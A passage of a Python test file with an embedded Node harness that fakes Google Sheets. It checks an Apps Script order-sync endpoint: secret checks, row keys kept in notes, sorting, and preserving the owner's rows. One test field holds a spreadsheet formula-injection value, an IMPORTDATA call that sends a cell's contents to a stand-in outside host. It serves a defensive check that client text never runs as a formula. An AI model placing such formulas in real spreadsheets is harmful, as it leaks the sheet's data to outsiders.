    assert sheet.flush(conn, box, fake, NOW) == {} and fake.posts == []
    with pytest.raises(sheet.SheetError, match="для этого адреса"):
        sheet.check(conn, box, fake)


# ---- the script run in node on a fake of Google Sheets ---------------------------------------------------------------------------------

HARNESS = r"""
var SECRET = 'S-1';
function Sheet(header, maxRows) {
  this.cells = [header.slice()]; this.notes = {}; this.valid = {}; this.formats = {}; this.maxRows = maxRows; this.raw = {}; this.formulas = {};
}
Sheet.prototype.width = function () { return this.cells[0].length; };
Sheet.prototype.get = function (r, c) { var row = this.cells[r - 1]; return row && row[c - 1] !== undefined ? row[c - 1] : ''; };
Sheet.prototype.set = function (r, c, v) {
  if (r > this.maxRows) throw new Error('Координаты диапазона находятся за пределами таблицы');
  while (this.cells.length < r) this.cells.push(new Array(this.width()).fill(''));
  this.raw[r + ',' + c] = v;
  if (typeof v === 'string' && v.charAt(0) === "'") v = v.slice(1);
  else if (typeof v === 'string' && /^[=+\-@]/.test(v)) { this.formulas[r + ',' + c] = v; v = 'FORMULA(' + v + ')'; }
  this.cells[r - 1][c - 1] = v;
};
Sheet.prototype.formula = function (r, c, f) { this.set(r, c, ''); this.formulas[r + ',' + c] = f; };   // a formula that shows nothing
Sheet.prototype.getLastColumn = function () { return this.width(); };
Sheet.prototype.getLastRow = function () {                          // as Google counts it: a value or a formula (even one that shows nothing)
  var self = this;
  for (var r = this.cells.length; r >= 1; r--) {
    if (this.cells[r - 1].some(function (v, j) { return v !== '' || self.formulas[r + ',' + (j + 1)]; })) return r;
  }
  return 0;
};
Sheet.prototype.getMaxRows = function () { return this.maxRows; };
Sheet.prototype.insertRowsAfter = function (after, n) { this.maxRows += n; };
Sheet.prototype.sortBy = function (c, desc) {                        // what the owner's sort does: the cells and their notes move together
  var self = this, body = [];
  var w = this.width();
  for (var r = 2; r <= this.cells.length; r++) {
    var notes = [], fs = []; for (var j = 1; j <= w; j++) { notes.push(this.notes[r + ',' + j] || ''); fs.push(this.formulas[r + ',' + j] || ''); }
    body.push({cells: this.cells[r - 1], notes: notes, fs: fs});
  }
  body.sort(function (a, b) { var x = String(a.cells[c - 1]), y = String(b.cells[c - 1]); return (x < y ? -1 : x > y ? 1 : 0) * (desc ? -1 : 1); });
  body.forEach(function (row, i) { self.cells[i + 1] = row.cells; row.notes.forEach(function (n, j) { self.notes[(i + 2) + ',' + (j + 1)] = n; });
    row.fs.forEach(function (f, j) { self.formulas[(i + 2) + ',' + (j + 1)] = f; }); });
};
Sheet.prototype.getRange = function (r, c, nr, nc) {
  var sheet = this;
  if (typeof r === 'string') throw new Error('A1 ranges are not used');
  nr = nr || 1; nc = nc || 1;
  function grid(f) { var out = []; for (var i = 0; i < nr; i++) { var row = []; for (var j = 0; j < nc; j++) row.push(f(r + i, c + j)); out.push(row); } return out; }
  return {
    getValues: function () { return grid(function (i, j) { return sheet.get(i, j); }); },
    getDisplayValues: function () { return grid(function (i, j) { return String(sheet.get(i, j)); }); },
    getFormulas: function () { return grid(function (i, j) { return sheet.formulas[i + ',' + j] || ''; }); },
    getNotes: function () { return grid(function (i, j) { return sheet.notes[i + ',' + j] || ''; }); },
    setNote: function (v) { sheet.notes[r + ',' + c] = v; return this; },
    setValue: function (v) { sheet.set(r, c, v); return this; },
    getDataValidation: function () { return sheet.valid[r + ',' + c] || null; },
    insertCheckboxes: function () { sheet.valid[r + ',' + c] = 'checkbox'; return this; },
    setNumberFormat: function (f) { sheet.formats[r + ',' + c] = f; return this; }
  };
};
var COLS = %(columns)s;
var header = COLS.slice().reverse().concat(['Комментарий владельца']);      // the owner's own order and an extra column of his
var sheet = new Sheet(header, 6);
var col = {}; header.forEach(function (n, i) { col[n] = i + 1; });
sheet.set(2, col['Имя'], "'Ручная строка"); sheet.set(2, col['Артикул'], "'M1");        // a row of the owner, no note
sheet.set(3, col['Комментарий владельца'], "'Итого");                                    // the owner's line «Итого» in his own column
sheet.set(3, col['Сумма продажи'], '=SUM(K2:K2)');
sheet.formula(4, col['Прибыль ₽'], '=IF(K4="";"";K4)');                                  // a formula that shows nothing: still taken
sheet.set(5, col['Примечание'], "'Заберут 02/08");                                       // a note of the owner alone in its row
sheet.set(6, col['Списание'], false);                                                    // a checkbox dragged down: not a filled row
var second = new Sheet(header, 2);                                         // another sheet: its last taken row is a formula that shows nothing
second.formula(2, col['Прибыль ₽'], '=IF(K2="";"";K2)');
var Book = {getSheetByName: function (n) { return n === 'Заказы' ? sheet : n === 'Второй' ? second : null; }};
var SpreadsheetApp = {getActiveSpreadsheet: function () { return Book; }, flush: function () {}};
var PropertiesService = {getScriptProperties: function () { return {getProperty: function (k) { return k === 'SECRET' ? SECRET : null; }}; }};
var LockService = {getScriptLock: function () { return {tryLock: function () { return true; }, releaseLock: function () {}}; }};
var ContentService = {MimeType: {JSON: 'json'}, createTextOutput: function (t) { return {text: t, setMimeType: function () { return this; }}; }};
%(script)s
function post(body) { return JSON.parse(doPost({postData: {contents: JSON.stringify(body)}}).text); }
function fields(art, name, client) {
  var f = {}; COLS.forEach(function (c) { f[c] = ''; });
  f['Дата'] = '2026-10-23'; f['Артикул'] = art; f['Наименование'] = name; f['Имя'] = client; f['Телефон'] = '+7 911 111-22-33';
  f['Кол-во'] = 4; f['Списание'] = false; f['Примечание'] = '=IMPORTDATA("https://x/?"&B2)'; f['Этап'] = 'Заказ оформлен';
  return f;
}
var out = {};
out.ping = post({secret: SECRET, sheet: 'Заказы', ping: true, columns: COLS.concat(['Нет такой'])});
out.wrong = post({secret: 'другой', sheet: 'Заказы', rows: []});
out.create = post({secret: SECRET, sheet: 'Заказы', rows: [
  {key: 'tires:1:1', create: true, fields: fields('111', 'Шина 111', 'Яна')},
  {key: 'tires:1:2', create: true, fields: fields('222', 'Шина 222', 'Алла')}]});
out.again = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: true, fields: fields('111', 'Шина 111', 'Яна')}]});
out.rowsAfterCreate = sheet.cells.length;
out.at = {one: sheet.notes['6,' + col['Дата']], two: sheet.notes['7,' + col['Дата']]};
out.text = {phone: sheet.raw['6,' + col['Телефон']], note: sheet.get(6, col['Примечание']), qty: sheet.raw['6,' + col['Кол-во']],
            day: sheet.get(6, col['Дата']) instanceof Date ? sheet.get(6, col['Дата']).getHours() : null, fmt: sheet.formats['6,' + col['Дата']],
            box: sheet.valid['6,' + col['Списание']] || null, manual: sheet.get(2, col['Имя'])};
out.kept = {total: sheet.get(3, col['Комментарий владельца']), sum: sheet.formulas['3,' + col['Сумма продажи']], empty: sheet.formulas['4,' + col['Прибыль ₽']],
            name3: sheet.get(3, col['Имя']), name4: sheet.get(4, col['Имя']), note5: sheet.get(5, col['Примечание']), name5: sheet.get(5, col['Имя'])};
sheet.sortBy(col['Имя'], false);                                          // Алла, Ручная строка, Яна
out.update = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Этап': 'Товар на точке'}, check: {'Артикул': '111'}}]});
out.afterSort = {};
for (var r = 2; r <= sheet.cells.length; r++) if (sheet.get(r, col['Имя'])) out.afterSort[sheet.get(r, col['Имя'])] = sheet.get(r, col['Этап']);
var alla = Object.keys(sheet.notes).filter(function (k) { return sheet.notes[k] === 'tires:1:2'; })[0].split(',')[0];
sheet.set(Number(alla), col['Артикул'], "'333");                         // the owner rewrote the row
out.rewritten = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:2', create: false, fields: {'Этап': 'Выполнено'}, check: {'Артикул': '222'}}]});
out.allaStage = sheet.get(Number(alla), col['Этап']);
out.gone = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:9:9', create: false, fields: {'Этап': 'x'}, check: {'Артикул': '1'}}]});
out.lacking = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Нет такой': 1}}]});
out.manualAfter = [];                                                     // the owner's column after everything: only his «Итого»
for (var r2 = 2; r2 <= sheet.cells.length; r2++) if (sheet.get(r2, col['Комментарий владельца']) !== '') out.manualAfter.push(sheet.get(r2, col['Комментарий владельца']));
out.second = post({secret: SECRET, sheet: 'Второй', rows: [{key: 'tires:2:1', create: true, fields: fields('111', 'Шина 111', 'Ян')}]});
out.secondAt = {formula: second.formulas['2,' + col['Прибыль ₽']], note2: second.notes['2,' + col['Дата']] || '', note3: second.notes['3,' + col['Дата']]};
console.log(JSON.stringify(out));
"""


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_script_on_a_fake_of_google_sheets(tmp_path):
    path = tmp_path / "run.js"
    path.write_text(HARNESS % {"columns": json.dumps(list(sheet.COLUMNS), ensure_ascii=False), "script": script_text()}, encoding="utf-8")
    done = subprocess.run(["node", str(path)], capture_output=True, text=True)
    assert done.returncode == 0, done.stderr
    out = json.loads(done.stdout)
    assert out["ping"] == {"ok": True, "missing": ["Нет такой"]} and out["wrong"] == {"ok": False, "error": "неверный секрет"}
    assert out["create"]["results"] == [{"key": "tires:1:1", "status": "created"}, {"key": "tires:1:2", "status": "created"}]
    assert out["again"]["results"] == [{"key": "tires:1:1", "status": "updated"}] and out["rowsAfterCreate"] == 7    # no double row
    assert out["at"] == {"one": "tires:1:1", "two": "tires:1:2"}           # under the owner's rows «Итого» and the formula, over the checkbox; rows added
    assert out["kept"] == {"total": "Итого", "sum": "=SUM(K2:K2)", "empty": '=IF(K4="";"";K4)', "name3": "", "name4": "", "note5": "Заберут 02/08", "name5": ""}
    assert out["text"] == {"phone": "'+7 911 111-22-33", "note": '=IMPORTDATA("https://x/?"&B2)', "qty": 4, "day": 12, "fmt": "dd.mm.yyyy",
                           "box": "checkbox", "manual": "Ручная строка"}             # text as text: a formula of a client never runs
    assert out["update"]["results"] == [{"key": "tires:1:1", "status": "updated"}]
    assert out["afterSort"] == {"Алла": "Заказ оформлен", "Ручная строка": "", "Яна": "Товар на точке"}     # sorted: still the right row
    assert out["rewritten"]["results"] == [{"key": "tires:1:2", "status": "missing"}] and out["allaStage"] == "Заказ оформлен"
    assert out["gone"]["results"] == [{"key": "tires:9:9", "status": "missing"}]
    assert out["second"]["results"] == [{"key": "tires:2:1", "status": "created"}]
    assert out["secondAt"] == {"formula": '=IF(K2="";"";K2)', "note2": "", "note3": "tires:2:1"}                     # under the formula, not on it
    assert out["lacking"]["results"][0]["status"] == "error" and out["manualAfter"] == ["Итого"]
